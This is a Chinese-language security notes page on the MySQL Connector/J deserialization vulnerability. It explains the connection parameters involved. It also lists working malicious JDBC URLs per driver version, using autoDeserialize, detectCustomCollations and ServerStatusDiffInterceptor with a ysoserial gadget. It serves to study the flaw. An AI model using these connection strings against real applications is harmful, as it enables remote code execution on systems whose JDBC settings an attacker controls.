---
title: "MySQL JDBC反序列化漏洞"
author: ["4shen0ne"]
lastmod: 2024-12-14T01:38:36+08:00
tags: ["java"]
draft: false
---

如果攻击者能够控制 JDBC 连接设置项，那么就可以通过设置其指向恶意 MySQL 服务器进行
ObjectInputStream.readObject()的反序列化攻击从而 RCE。

具体点说，就是通过 JDBC 连接 MySQL 服务端时，会有几个内置的 SQL 查询语句要执行，其中两
个查询的结果集在 MySQL 客户端被处理时会调用 ObjectInputStream.readObject()进行反序
列化操作。如果攻击者搭建恶意 MySQL 服务器来控制这两个查询的结果集，并且攻击者可以
控制 JDBC 连接设置项，那么就能触发 MySQL JDBC 客户端反序列化漏洞。

可被利用的两条查询语句：

-   SHOW SESSION STATUS
-   SHOW COLLATION

相关：[JDBC Attack]({{< relref "jdbc_attack.md" >}})


## JDBC 连接参数 {#jdbc-连接参数}


### tatementInterceptors {#tatementinterceptors}

该连接参数是用于指定实现 com.mysql.jdbc.StatementInterceptor 接口的类的逗号分隔
列表的参数。这些拦截器可用于通过在查询执行和结果返回之间插入自定义逻辑来影响查询
执行的结果，这些拦截器将被添加到一个链中，第一个拦截器返回的结果将被传递到第二个
拦截器，以此类推。在 8.0 中被 queryInterceptors 参数替代


### queryInterceptors {#queryinterceptors}

一个逗号分割的 Class 列表（实现了 com.mysql.cj.interceptors.QueryInterceptor 接口的
Class），在 Query"之间"进行执行来影响结果。（效果上来看是在 Query 执行前后各插入一
次操作）


### autoDeserialize {#autodeserialize}

自动检测与反序列化存在 BLOB 字段中的对象


### detectCustomCollations {#detectcustomcollations}

驱动程序是否应该检测服务器上安装的自定义字符集/排序规则，如果此选项设置为“true”，
驱动程序会在每次建立连接时从服务器获取实际的字符集/排序规则。这可能会显着减慢连
接初始化速度


## 利用链：detectCustomCollations {#利用链-detectcustomcollations}

-   5.1.19-5.1.28
    jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;user=yso_JRE8u20_calc

-   5.1.29-5.1.48
    jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_JRE8u20_calc

-   5.1.49：不可用

-   6.0.2-6.0.6
    jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_JRE8u20_calc

-   8.x.x ：不可用


## 利用链：ServerStatusDiffInterceptor {#利用链-serverstatusdiffinterceptor}

-   5.1.0-5.1.10
    jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc
    连接后需执行查询

-   5.1.11-5.x.xx
    jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc

-   6.x
    jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc
    （包名中添加 cj）

-   8.0.20 以下
    jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc
